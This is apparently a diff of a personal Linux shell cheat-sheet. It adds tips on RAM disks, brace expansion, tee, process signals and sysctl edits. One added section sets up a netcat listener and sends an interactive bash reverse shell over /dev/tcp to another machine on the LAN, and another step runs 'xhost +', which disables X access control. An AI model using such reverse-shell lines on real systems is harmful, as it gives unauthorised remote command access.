@@ -63,8 +63,6 @@ for vid in *.avi; do ffmpeg -i $vid ${vid//avi/webm}; done
 
 for img in *.png; do glslViewer -w 1080 -h 1080 ../j-shaders-textures/test00.frag $img
 
-for img in *.png; do onvert $img -transparent black ${img//.png/-TX.png}; done
-
 for img in *.png; do convert $img -transparent black ${img//.png/-TX.png}; done
 
 *** Multiple images (example, renaming with identifying suffix and saving in a sibling folder):
@@ -291,7 +289,7 @@ rsync 4.txt john@192.168.8.104:/media/john/omicron
 # -r => recursive copy
 scp -r ~/amazing john@221.48.119.105:~/ # random IP! => home folder
 (think need SSH key-based auth set up)
-
+ 
 Git: Revert to precious commit without losing history:
 
 git reset --hard a698706
@@ -486,4 +484,68 @@ If running a long `dd` copy, from another terminal run
 `sudo kill -USR1 $(pgrep -l '^dd$' | sed 's/.\{2\}$//')`
 to get it to log progress to STDERR.
 
+# Ram Disk
+$ mkdir -p /mnt/ram
+$ sudo mount -t tmpfs tmpfs /mnt/ram -o size=8192M
+$ cd /mnt/ram/
+$ sudo dd if=/dev/zero of=test.iso bs=8M count=32768
+5880414208 bytes (5.9 GB, 5.5 GiB) copied, 84.2994 s, 69.8 MB/s
+## MUCH faster for temporary storage
+# then
+$ sudo umount /mnt/ram
 
+# Prepend a command with a space so it's not appended to history.
+
+# Open the last command in the default editor
+$ fc
+
+# Use brace syntax to create multiple diredtories
+$ mkdir -p folder/{kid1,kid2}/{gc1,gc2,gc3}
+# Note: no spaces between args in braces, else it gets parsed wrongly
+
+# Create multiple numbered directories
+$ mkdir -p folder/{1..32}/{3..12}
+
+# Use 
+$ tee -a log.txt
+# to intercept a pipe and log to a file
+$ cat fred.txt | tee -a log.txt | cat > /dev/null
+
+# Set up a reverse server.
+
+# On machine A, 192.168.8.113, listen on a port with netcat:
+$ nc -lp 1337
+# On machine B, 192.168.8.104, forward the local SSH port, 22, to the remote port 1337, with
+$ sudo ssh -L 22:192.168.8.113:1337 john@127.0.0.1
+# Then from machine B I can send a shell to the netcat command listening on port 1337:
+$ bash -i >& /dev/tcp/192.168.8.113/1337 0>&1
+# and suddenly a shell prompt opens where netcat is listening
+
+# SSH with GUI:
+# Set
+$ xhost +
+# (on server)
+# and run ssh with -X option at the end:
+$ sudo ssh john@192.168.8.104 -X
+
+
+# Some signals:
+# 1) SIGHUP    2) SIGINT   3) SIGQUIT  4) SIGILL   5) SIGTRAP
+ # 6) SIGABRT  7) SIGBUS   8) SIGFPE   9) SIGKILL 10) SIGUSR1
+# 11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM
+# 16) SIGSTKFLT   17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP
+
+
+# Kill a process
+$ kill -15 6067
+$ kill -9 6067
+# Order: 15, 2, 1, 9
+
+# Ctrl+z sends a signal 20, SIGTSTP
+# fg or bg send a signal 18, SIGCONT
+
+# So send 20 to stop a process, 18 to restart
+
+# Redirection writing to a file in root dir:
+
+sudo sh -c 'echo "fs.inotify.max_user_watches=524288" >> /etc/sysctl.conf'
